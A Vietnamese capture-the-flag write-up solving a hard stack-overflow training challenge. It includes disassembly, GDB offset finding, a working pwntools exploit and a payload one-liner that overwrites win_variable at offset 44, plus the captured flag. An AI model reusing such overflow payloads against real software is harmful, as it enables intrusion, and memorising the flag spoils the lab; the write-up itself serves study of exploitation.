## 📌 [Viettel Training Program] - Precision (hard)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Hard
- **Points:** —
- **Description:** Cùng ý tưởng với bản easy — overflow buffer để ghi đè `win_variable` thành khác 0, nhưng có `lose_variable` phía sau cần tránh — nhưng **không in offset hay dump stack**. Binary: `binary-exploitation-lose-variable` (không source).

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-lose-variable
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**Nhận xét nhanh:**

- **Stack Canary bật** → Không được ghi đè quá xa (canary ở offset ~56 từ input), nhưng bài chỉ cần ghi 48 byte — an toàn.
- **NX enabled** → Không cần shellcode.
- **PIE disabled** → Địa chỉ code cố định.
- **Không có output debug** (khác easy) → Offset phải tự tìm bằng disassembly hoặc GDB/pwndbg.

**So với bản easy:**

| | Easy (`-w`) | Hard |
|---|-------------|------|
| Binary | `binary-exploitation-lose-variable-w` | `binary-exploitation-lose-variable` |
| Source | Có source | **Chỉ binary** |
| In offset / dump stack | Có | **Không** |
| Kích thước vùng input | 20 byte (18 + 2 padding) | **44 byte** (không rõ cấu trúc) |
| Offset → `win_variable` | 20 | **44** |
| Offset → `lose_variable` | 24 | **48** |
| Payload tối thiểu | 24 byte | **48 byte** |

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích tĩnh (objdump / Ghidra)

Disassembly hàm `challenge()` (địa chỉ `0x401db6`):

```asm
; Khởi tạo vùng nhớ (7 QWORD + 1 DWORD = 52 bytes zero)
movq   $0x0, -0x40(%rbp)       ; input[0..7]
movq   $0x0, -0x38(%rbp)       ; input[8..15]
movq   $0x0, -0x30(%rbp)       ; input[16..23]
movq   $0x0, -0x28(%rbp)       ; input[24..31]
movq   $0x0, -0x20(%rbp)       ; input[32..39]
movq   $0x0, -0x18(%rbp)       ; input[40..47]
movl   $0x0, -0x10(%rbp)       ; lose_variable (int)

; read(0, rbp-0x40, 4096)
lea    -0x40(%rbp), %rax        ; input buffer
mov    $0x1000, %edx
call   read@plt

; Kiểm tra lose_variable
mov    -0x10(%rbp), %eax        ; rbp-0x10
test   %eax, %eax
jne    lose_set → exit

; Kiểm tra win_variable
mov    -0x14(%rbp), %eax        ; rbp-0x14
test   %eax, %eax
jne    call win()
```

Dựng lại cấu trúc:

```c
struct {
    char input[44];      // rbp-0x40 … rbp-0x15
    int win_variable;    // rbp-0x14
    int lose_variable;   // rbp-0x10
} data = {0};

read(0, &data.input, 4096);

if (data.lose_variable) { puts("Lose variable is set! Quitting!"); exit(1); }
if (data.win_variable)  win();
puts("Goodbye!");
```

### Tính offset từ disassembly

| Thành phần | Vị trí stack | Offset từ `input` |
|------------|--------------|-------------------|
| `input[44]` | `rbp-0x40` … `rbp-0x15` | 0 – 43 |
| `win_variable` | `rbp-0x14` | **44 – 47** |
| `lose_variable` | `rbp-0x10` | **48 – 51** |
| Stack canary | `rbp-0x8` | 56 – 63 (không động tới) |

Khoảng cách: `0x40 - 0x14 = 0x2C` → **44 byte** padding trước `win_variable`.

### Phân tích động (GDB / pwndbg)

```text
$ gdb ./binary-exploitation-lose-variable
pwndbg> break *challenge+0xef    # sau lệnh read (0x401ea5)
pwndbg> run
Send your payload (up to 4096 bytes)!
pwndbg> cyclic 60
pwndbg> continue
pwndbg> x/wx $rbp-0x14           # win_variable
0x7fffffffe4bc: 0x61616161

pwndbg> cyclic -l 0x61616161
[*] Found offset of 44

pwndbg> x/wx $rbp-0x10           # lose_variable
0x7fffffffe4c0: 0x00000000       # chưa bị động tới (nếu payload ≤ 48 byte)
```

Hoặc chạy một lần với payload thử:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x01\x00\x00\x00")' | ./binary-exploitation-lose-variable
```

=> **Offset tới `win_variable` = 44 bytes**.

## 3. Ý tưởng Tấn công (Exploit Strategy)

Vẫn là **variable overwrite** với yêu cầu độ chính xác:

1. Gửi **44 byte** padding (lấp `input[]`).
2. Ghi **4 byte** little-endian khác 0 vào `win_variable` (ví dụ `p32(1)`).
3. **Dừng lại ngay** — không ghi thêm byte nào để tránh chạm `lose_variable` (offset 48).
4. `if (data.win_variable)` → `win()` → in flag.

> Payload tối đa **48 byte**. Nếu ghi tới byte 52+, `lose_variable` bị set → chương trình thoát.

> Offset khác hoàn toàn so với bản easy (20) — không copy mù quáng.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-lose-variable")
# r = process("./binary-exploitation-lose-variable")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_WIN = 44   # input → win_variable (hard, khác easy: 20)
OFFSET_LOSE = 48  # input → lose_variable

payload = flat({
    OFFSET_WIN: p32(1),   # win_variable = 1, lose_variable giữ nguyên 0
})

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-lose-variable")
r.sendafter(b"Send your payload", b"A" * 44 + p32(1))
r.interactive()
```

Hoặc không dùng pwntools (local):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x01\x00\x00\x00")' | ./binary-exploitation-lose-variable
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):

```text
Send your payload (up to 4096 bytes)!
You win! Here is your flag:
pwn.college{kGadnJwKLlkaAZCz9KIlUclrLZH.0VNwcDMxwSMzgjNwEzW}
```

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- Bản **hard** không cho offset sẵn: phải dùng **disassembly** (`lea` buffer / `cmp` win_variable & lose_variable) hoặc **GDB + cyclic**.
- Cùng ý tưởng "precision overwrite" nhưng bản hard có **layout khác** (44 byte input, offset 44 thay vì 20).
- `lose_variable` luôn nằm ngay sau `win_variable` trong memory → cần **cắt payload đúng độ dài** để tránh ghi đè.
- **Stack canary** không phải vấn đề nếu payload dừng trước nó (ở offset ~56).
- Luôn đối chiếu mitigations (`checksec`) và disassembly giữa easy và hard trước khi tái sử dụng payload cũ.
